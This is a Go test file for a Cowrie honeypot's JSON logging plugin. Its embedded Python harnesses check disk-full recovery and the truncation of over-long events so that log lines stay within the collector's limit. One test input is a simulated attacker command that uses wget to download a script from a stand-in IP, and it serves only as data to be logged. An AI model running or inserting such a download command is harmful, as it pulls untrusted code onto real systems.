package instance

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// cowrieJSONLogUnitHarness runs the patched output plugin outside Cowrie
// (Twisted and Cowrie's modules are stubbed) over a log file whose writes
// the test rations, as a full disk does. It prints a JSON object.
const cowrieJSONLogUnitHarness = `
import errno, importlib.util, json, os, sys, types

module, work = sys.argv[1], sys.argv[2]
def stub(name, **attrs):
    m = types.ModuleType(name)
    m.__dict__.update(attrs)
    sys.modules[name] = m
    parent, _, child = name.rpartition(".")
    if parent:
        setattr(sys.modules[parent], child, m)
    return m

class Call:
    def active(self): return False
    def cancel(self): pass
class Logger:
    def error(self, *a, **k): pass
    def info(self, *a, **k): pass
class Config:
    values = {("output_jsonlog", "logfile"): os.path.join(work, "cowrie.json"), ("honeypot", "logtype"): "plain",
              ("output_jsonlog", "qpot_spill"): os.path.join(work, "spill")}
    @classmethod
    def get(cls, section, key, fallback=None): return cls.values.get((section, key), fallback)
    @classmethod
    def getboolean(cls, section, key, fallback=False): return fallback
class Base: pass
stub("twisted"); stub("twisted.internet", reactor=types.SimpleNamespace(callLater=lambda *a, **k: Call())); stub("twisted.logger", Logger=Logger)
stub("cowrie"); stub("cowrie.core"); stub("cowrie.core.output", Output=Base); stub("cowrie.python"); stub("cowrie.python.logfile"); stub("cowrie.core.config", CowrieConfig=Config)
spec = importlib.util.spec_from_file_location("jsonlog", module)
jsonlog = importlib.util.module_from_spec(spec)
spec.loader.exec_module(jsonlog)
jsonlog.QPOT_SPILL_BYTES = 4096
jsonlog.QPOT_STOP_WAIT_SECONDS = 0

class Rationed:
    """The log file, taking only as many bytes as it is given room for."""
    def __init__(self, f): self.f, self.room = f, None  # None: no limit
    def write(self, data):
        if self.room is None: return self.f.write(data)
        if self.room == 0: raise OSError(errno.ENOSPC, "No space left on device")
        n = min(len(data), self.room)
        self.room -= n
        return self.f.write(data[:n])
    def flush(self): self.f.flush()

def new_output():
    out = jsonlog.Output.__new__(jsonlog.Output)
    out.start()
    out.outfile = Rationed(out.outfile)
    return out
def event(n): return {"eventid": "cowrie.session.connect", "n": n, "time": 1.0, "log_x": 1}
def text(n): return json.dumps({"eventid": "cowrie.session.connect", "n": n}, separators=(",", ":"))
def log(): return open(Config.values[("output_jsonlog", "logfile")], "rb").read().decode()
def spill(): return open(Config.values[("output_jsonlog", "qpot_spill")], "rb").read().split(b"\0")[0].decode()

failures = []
def check(ok, what):
    if not ok: failures.append(what)

# 1. The disk takes ten bytes of a line and then nothing. When there is room
# the line is not continued where it broke: what is there is ended, and the
# whole line follows. (The collector tells lines apart by where they start; a
# line it had read the first piece of would otherwise get another place than
# the same line read at once.)
out = new_output()
out.write(event(1))
out.outfile.room = 10
out.write(event(2))
check(log() == text(1) + "\n" + text(2)[:10], "ten bytes of room: the log holds %r" % log())
out.write(event(3))
check(log() == text(1) + "\n" + text(2)[:10] and len(out.qpot_pending) == 2, "a full disk: %r, %d waiting" % (log(), len(out.qpot_pending)))
out.outfile.room = None
out.qpot_drain()
want = text(1) + "\n" + text(2)[:10] + "\n" + text(2) + "\n" + text(3) + "\n"
check(log() == want, "after room came back the log holds %r, want %r" % (log(), want))

# 2. Stopped on a disk that stays full: what waits goes into the spill file
# and is no longer this process's to write. An event that arrives after that
# (Cowrie still emits some while it shuts down) is written by itself when
# there is room, and does not empty the spill file.
out.outfile.room = 0
out.write(event(4)); out.write(event(5))
out.stop()
check(spill() == text(4) + "\n" + text(5) + "\n" and not out.qpot_pending, "stopped on a full disk: spill %r, %d still waiting" % (spill(), len(out.qpot_pending)))
out.outfile.room = None
out.write(event(6))
check(log() == want + text(6) + "\n", "an event after the stop: the log holds %r" % log()[len(want):])
check(spill() == text(4) + "\n" + text(5) + "\n", "an event after the stop emptied the spill file: %r" % spill())

# 3. The next start writes the spilled lines, once, and marks the file empty.
again = new_output()
check(log() == want + text(6) + "\n" + text(4) + "\n" + text(5) + "\n", "after the next start: %r" % log()[len(want):])
check(spill() == "", "the spill file still holds lines after they were written: %r" % spill())
third = new_output()
third.write(event(7))
lines = log().split("\n")
check(all(lines.count(text(n)) == 1 for n in range(1, 8)), "an event is in the log twice or not at all: %r" % [lines.count(text(n)) for n in range(1, 8)])

# 4. Stopped with a line half written: the next start ends it first.
third.outfile.room = 7
third.write(event(8))
third.stop()
last = new_output()
last.write(event(9))
check(log().endswith(text(7) + "\n" + text(8)[:7] + "\n" + text(8) + "\n" + text(9) + "\n"), "a line half written at a stop: %r" % log()[-150:])
print(json.dumps({"failures": failures}))
`

// TestCowrieJSONLogEndsAHalfWrittenLine: a line the disk took part of is
// ended and written again whole, never continued; lines kept at a stop are
// written once, by the next start. The first version continued the line,
// and the failure soak stored one connection in 46,000 twice: the collector
// had read the first piece, gave the completed line the position of the
// second, and gave it its true position when it read the file again.
func TestCowrieJSONLogEndsAHalfWrittenLine(t *testing.T) {
	py := python(t)
	dir := t.TempDir()
	module := filepath.Join(dir, "jsonlog.py")
	harness := filepath.Join(dir, "harness.py")
	work := filepath.Join(dir, "work")
	if err := os.Mkdir(work, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(module, cowrieJSONLogPy, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(harness, []byte(cowrieJSONLogUnitHarness), 0o600); err != nil {
		t.Fatal(err)
	}
	out, err := exec.Command(py, harness, module, work).CombinedOutput()
	if err != nil {
		t.Fatalf("harness: %v\n%s", err, out)
	}
	var res struct {
		Failures []string `json:"failures"`
	}
	if err := json.Unmarshal(out, &res); err != nil {
		t.Fatalf("harness output: %v\n%s", err, out)
	}
	for _, f := range res.Failures {
		t.Error(f)
	}
}

// cowrieJSONLogBoundScenario follows the stubs of cowrieJSONLogUnitHarness
// (everything before its first scenario).
const cowrieJSONLogBoundScenario = `
import hashlib
failures = []
def check(ok, what):
    if not ok: failures.append(what)
LIMIT = 102400  # the collector's longest line
def written(e):
    """Write e to an empty log and return the one line it became."""
    open(Config.values[("output_jsonlog", "logfile")], "wb").close()
    out = new_output()
    out.write(dict(e, time=1.0, log_x=1))
    data = open(Config.values[("output_jsonlog", "logfile")], "rb").read()
    check(data.endswith(b"\n") and data.count(b"\n") == 1, "%s: not one line: %d newlines" % (e["session"], data.count(b"\n")))
    check(len(data) < LIMIT and len(data) <= jsonlog.QPOT_LINE_BYTES, "%s: a line of %d bytes" % (e["session"], len(data)))
    return json.loads(data)
def sha(text): return hashlib.sha256(text.encode("utf-8")).hexdigest()
base = {"eventid": "cowrie.command.input", "session": "", "src_ip": "203.0.113.5", "src_port": 4022, "sensor": "s"}

# 1. What a visitor did on a live instance: one command of 60,000 characters,
# which Cowrie writes twice. The collector discarded the line of 120 kB.
cmd = "echo marker; wget http://198.51.100.77/x.sh; echo " + "A" * 60000
got = written(dict(base, session="long", input=cmd, message="CMD: " + cmd))
check(got["input"] == cmd[:16384] and got["message"] == ("CMD: " + cmd)[:16384], "long command: input of %d and message of %d characters" % (len(got["input"]), len(got["message"])))
check(got.get("qpot_truncated") == {"input": {"chars": len(cmd), "sha256": sha(cmd)}, "message": {"chars": len(cmd) + 5, "sha256": sha("CMD: " + cmd)}}, "long command: qpot_truncated is %r" % got.get("qpot_truncated"))
check(got["session"] == "long" and got["src_ip"] == "203.0.113.5" and got["src_port"] == 4022 and got["eventid"] == "cowrie.command.input", "long command: who and what were changed: %r" % {k: v for k, v in got.items() if k not in ("input", "message")})

# 2. A line that fits is written as it is.
cmd = "echo " + "B" * 20000
e = dict(base, session="fits", input=cmd, message="CMD: " + cmd)
check(written(e) == e, "a line of 40 kB was changed")

# 3. Characters that take twelve bytes each in the log.
cmd = chr(0x1F600) * 30000
got = written(dict(base, session="wide", input=cmd))
check(cmd.startswith(got["input"]) and 0 < len(got["input"]) < len(cmd) and got["qpot_truncated"]["input"] == {"chars": 30000, "sha256": sha(cmd)}, "wide characters: input of %d characters, %r" % (len(got["input"]), got.get("qpot_truncated")))

# 4. A long list (the algorithms a client offers) is cut as its JSON text.
algs = ["alg-%05d-%s" % (n, "x" * 20) for n in range(5000)]
got = written(dict(base, session="list", kexAlgs=algs))
text = json.dumps(algs, separators=(",", ":"))
check(isinstance(got["kexAlgs"], str) and text.startswith(got["kexAlgs"]) and got["qpot_truncated"]["kexAlgs"] == {"chars": len(text), "sha256": sha(text)}, "long list: %r" % got.get("qpot_truncated"))

# 5. More keys than any event has: who and what are kept.
many = dict(base, session="keys", input="id")
for n in range(6000): many["k%d" % n] = "v" * 40
got = written(many)
check(got.get("session") == "keys" and got.get("src_ip") == "203.0.113.5" and got.get("input") == "id" and got.get("qpot_truncated") == {"keys": len(many) + 1}, "many keys: %r" % {k: got[k] for k in list(got)[:8]})
print(json.dumps({"failures": failures}))
`

// TestCowrieJSONLogNeverWritesALineTheCollectorDiscards: the collector
// discards, whole, a line longer than 102,400 bytes. On a live instance a
// visitor's command of 60,000 characters (which Cowrie writes twice, 120 kB
// in one line) was stored neither in the database nor in the log backup.
// Whatever an event holds, its line must fit, and say what was cut from it.
func TestCowrieJSONLogNeverWritesALineTheCollectorDiscards(t *testing.T) {
	py := python(t)
	dir := t.TempDir()
	module := filepath.Join(dir, "jsonlog.py")
	harness := filepath.Join(dir, "harness.py")
	work := filepath.Join(dir, "work")
	if err := os.Mkdir(work, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(module, cowrieJSONLogPy, 0o600); err != nil {
		t.Fatal(err)
	}
	stubs, _, found := strings.Cut(cowrieJSONLogUnitHarness, "\nfailures = []\n")
	if !found {
		t.Fatal("the unit harness no longer has the stubs this test reuses")
	}
	if err := os.WriteFile(harness, []byte(stubs+cowrieJSONLogBoundScenario), 0o600); err != nil {
		t.Fatal(err)
	}
	out, err := exec.Command(py, harness, module, work).CombinedOutput()
	if err != nil {
		t.Fatalf("harness: %v\n%s", err, out)
	}
	var res struct {
		Failures []string `json:"failures"`
	}
	if err := json.Unmarshal(out, &res); err != nil {
		t.Fatalf("harness output: %v\n%s", err, out)
	}
	for _, f := range res.Failures {
		t.Error(f)
	}
}
